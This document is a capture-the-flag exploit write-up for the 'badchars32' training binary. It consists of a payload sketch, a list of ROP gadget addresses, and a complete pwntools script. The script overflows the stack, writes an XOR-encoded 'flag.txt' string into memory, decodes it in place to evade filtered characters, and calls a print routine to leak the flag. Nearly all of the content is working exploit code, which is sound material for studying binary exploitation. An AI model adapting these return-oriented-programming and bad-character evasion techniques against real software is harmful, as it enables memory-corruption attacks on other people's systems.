```payload = {
	b"0"*44 
    pop_gadget 
    p32(xor key ) #to change bl to 0x03
    xor(b"flag",key)
    address in data table 
    address in data table 
    mov_gagdget
    pop gadget 
    p32(xor key )
    xor(b".txt", key)
    address in data table + 4 bytes 
    address in data table + 4 bytes 
    mov_gadget 

    #xoring all 8 charecters# 

    print_addr 
    p32(0x00)
    address in data table

}


0x0804854f : mov dword ptr [edi], esi ; ret == move_gadget 
0x080485b8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret == pop_gadget
0x08048547 : xor byte ptr [ebp], bl ; ret == xor gadget
address in data table 
print_Addr = 0x80483d0

```

Sample how the payload structure will look . 

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./badchars32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './badchars32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'

io = start()

io.recvuntil(b">")

pop_ebp = p32(0x080485bb)
pop_gadget = p32(0x080485b8)

mov_gadget = p32(0x0804854f)

xor_gadget = p32(0x08048547)

print_addr = p32(0x80483d0)

add1= p32(0x0804a018)
add2 = p32(0x0804a01c)

key  = ord(b"{")

str1= xor(b"flag",key)
str2=xor(b".txt", key)

payload = b"0"*44 + pop_gadget + p32(key) + str1 +add1 +add1+mov_gadget+ pop_gadget+p32(key) +str2 + add2 +  add2 + mov_gadget
payload += pop_ebp +p32(0x804a018) + xor_gadget 
payload += pop_ebp +p32(0x804a019) + xor_gadget 
payload += pop_ebp +p32(0x804a01a) + xor_gadget 
payload += pop_ebp +p32(0x804a01b) + xor_gadget 
payload += pop_ebp +p32(0x804a01c) + xor_gadget 
payload += pop_ebp +p32(0x804a01d) + xor_gadget 
payload += pop_ebp +p32(0x804a01e) + xor_gadget 
payload += pop_ebp +p32(0x804a01f) + xor_gadget 

payload+= print_addr + p32(0x00)+ add1
io.send(payload)



# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

```

